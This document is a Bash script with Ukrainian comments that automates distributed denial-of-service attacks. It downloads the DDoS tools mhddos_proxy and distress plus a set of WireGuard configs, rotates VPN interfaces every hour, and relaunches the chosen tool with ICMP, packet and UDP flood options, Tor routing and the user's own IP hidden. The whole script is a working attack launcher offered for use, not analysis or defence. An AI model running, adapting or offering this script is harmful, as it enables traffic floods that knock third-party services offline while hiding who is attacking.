#!/bin/bash

set -e

# === Автоматична підготовка для будь-якого Linux ===

echo "[+] Перевірка користувача..."
if [ "$(id -u)" -eq 0 ]; then
    SUDO=""
    echo "[+] Ви root. sudo не потрібен."
else
    if command -v sudo >/dev/null 2>&1; then
        SUDO="sudo"
        echo "[+] sudo доступний."
    else
        echo "[-] sudo не знайдено. Встановіть або увійдіть як root."
        exit 1
    fi
fi

echo "[+] Визначення пакетного менеджера..."
if command -v apt >/dev/null 2>&1; then
    PKG_MANAGER="apt"
    UPDATE_CMD="$SUDO apt update -y"
    INSTALL_CMD="$SUDO apt install -y"
elif command -v apt-get >/dev/null 2>&1; then
    PKG_MANAGER="apt-get"
    UPDATE_CMD="$SUDO apt-get update -y"
    INSTALL_CMD="$SUDO apt-get install -y"
elif command -v dnf >/dev/null 2>&1; then
    PKG_MANAGER="dnf"
    UPDATE_CMD="$SUDO dnf check-update || true"
    INSTALL_CMD="$SUDO dnf install -y"
elif command -v yum >/dev/null 2>&1; then
    PKG_MANAGER="yum"
    UPDATE_CMD="$SUDO yum check-update || true"
    INSTALL_CMD="$SUDO yum install -y"
elif command -v apk >/dev/null 2>&1; then
    PKG_MANAGER="apk"
    UPDATE_CMD="$SUDO apk update"
    INSTALL_CMD="$SUDO apk add"
else
    echo "[-] Підтримуваний пакетний менеджер не знайдено."
    exit 1
fi

echo "[+] Менеджер пакетів: $PKG_MANAGER"

echo "[+] Оновлення системи і встановлення необхідних пакетів..."
$UPDATE_CMD
$INSTALL_CMD curl wget git screen sed

# === Завантаження або створення конфігуратора ===

CONFIG_FILE="$HOME/.kaljan_config"

if [[ ! -f "$CONFIG_FILE" ]]; then
    echo "[+] Перший запуск. Налаштування параметрів..."

    echo "[?] Виберіть модуль:"
    echo "1 - mhddos_proxy"
    echo "2 - distress"
    read -rp "[1/2]: " module_choice

    echo "[?] Чи хочете відкривати .ini файли у nano перед запуском?"
    echo "1 - Так (рекомендується)"
    echo "0 - Ні (автоматично)"
    read -rp "[1/0]: " edit_ini

    echo "[?] Виберіть режим запуску:"
    echo "1 - через screen у фоні (рекомендується)"
    echo "2 - через screen без фону (відкрита сесія)"
    echo "3 - без використання screen (в терміналі)"
    read -rp "[1/2/3]: " run_mode

    cat > "$CONFIG_FILE" <<EOF
MODULE_CHOICE=$module_choice
RUN_MODE=$run_mode
EDIT_INI_ON_START=$edit_ini
EOF

    echo "[+] Налаштування збережено в $CONFIG_FILE"
fi

# Завантаження налаштувань
source "$CONFIG_FILE"

# Встановлення змінних
module_choice=$MODULE_CHOICE
run_mode=$RUN_MODE
edit_ini=$EDIT_INI_ON_START

# === Підготовка папок ===

MODULE_DIR="$HOME/modules"
WG_DIR="$HOME/wg_confs"
mkdir -p "$MODULE_DIR" "$WG_DIR"

WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
WG_RAW_BASE="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"

# === Завантаження WG-конфігів ===
echo "[+] Завантаження WG-конфігів..."
CONF_LIST=$(curl -fsSL "$WG_REPO_HTML" | grep -oP '(?<=href=").*?\.conf(?=")' | grep '/k7771/Kaljan747/blob/' | sed -e 's|^/|https://github.com/|' -e 's|blob/|raw/|' -e "s|https://github.com/k7771/Kaljan747/raw/k7771/wg/|$WG_RAW_BASE/|" | grep -E '\.conf$')

for url in $CONF_LIST; do
    file=$(basename "$url")
    wget -qO "$WG_DIR/$file" "$url" && echo "[+] Завантажено: $file" || echo "[-] Помилка при завантаженні: $file"
done

$SUDO chmod 600 "$WG_DIR"/*.conf 2>/dev/null || true

# === Створення .ini файлів ===
echo "[+] Перевірка .ini файлів..."
INI1="$MODULE_DIR/mhddos.ini"
INI2="$MODULE_DIR/distress.ini"

touch "$INI1" "$INI2"

# === Завантаження модулів ===
echo "[+] Завантаження модулів..."
[ -f "$MODULE_DIR/mhddos_proxy" ] || wget -qO "$MODULE_DIR/mhddos_proxy" https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux
[ -f "$MODULE_DIR/distress" ] || wget -qO "$MODULE_DIR/distress" https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl

chmod +x "$MODULE_DIR/mhddos_proxy" "$MODULE_DIR/distress"

# === Основний вибір модуля ===

case $module_choice in
    1)
        MODULE="$MODULE_DIR/mhddos_proxy"
        CONFIG_FILE="$INI1"
        MODULE_NAME="mhddos"
        ;;
    2)
        MODULE="$MODULE_DIR/distress"
        CONFIG_FILE="$INI2"
        MODULE_NAME="distress"
        ;;
    *)
        echo "[-] Невірний вибір модуля."
        exit 1
        ;;
esac

# === Основний цикл перезапуску ===
while true; do
    echo "[+] Зупинка модуля..."
    pkill -f "$MODULE" 2>/dev/null || screen -S "$MODULE_NAME" -X quit 2>/dev/null || true
    sleep 2

    echo "[+] Відключення всіх WG інтерфейсів..."
    for iface in $(wg show interfaces 2>/dev/null || true); do
        $SUDO wg-quick down "$iface" || true
        sleep 1
    done

    echo "[+] Підключення нових WG конфігів..."
    WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 4))
    WG_IFACES=()
    for conf in "${WG_FILES[@]}"; do
        IFACE_NAME=$(basename "$conf" .conf)
        $SUDO wg-quick up "$conf" && echo "[+] Підключено: $conf" || echo "[-] Не вдалося підключити: $conf"
        WG_IFACES+=("$IFACE_NAME")
        sleep 1
    done

    # === Оновлення ini файлів ===
    VPN_LIST_SPACES=$(IFS=' '; echo "${WG_IFACES[*]}")
    VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")

    echo "--use-my-ip 0 --copies auto -t 8000 --ifaces $VPN_LIST_SPACES" > "$INI1"
    echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS" > "$INI2"

    if [[ "$edit_ini" == "1" ]]; then
        if [[ "$module_choice" == "1" ]]; then
            echo "[?] Відкриття mhddos.ini для редагування..."
            sleep 1
            nano "$INI1"
        elif [[ "$module_choice" == "2" ]]; then
            echo "[?] Відкриття distress.ini для редагування..."
            sleep 1
            nano "$INI2"
        fi
    else
        echo "[+] Редагування ini файлів пропущено."
    fi

    ARGS=$(<"$CONFIG_FILE")

    echo "[+] Запуск модуля..."
    if [[ $run_mode == "1" ]]; then
        screen -dmS "$MODULE_NAME" $MODULE $(<"$CONFIG_FILE")
    elif [[ $run_mode == "2" ]]; then
        screen -S "$MODULE_NAME" $MODULE $(<"$CONFIG_FILE")
    else
        $MODULE $(<"$CONFIG_FILE")
    fi

    echo "[+] Очікування 59 хвилин..."
    sleep 3540
done
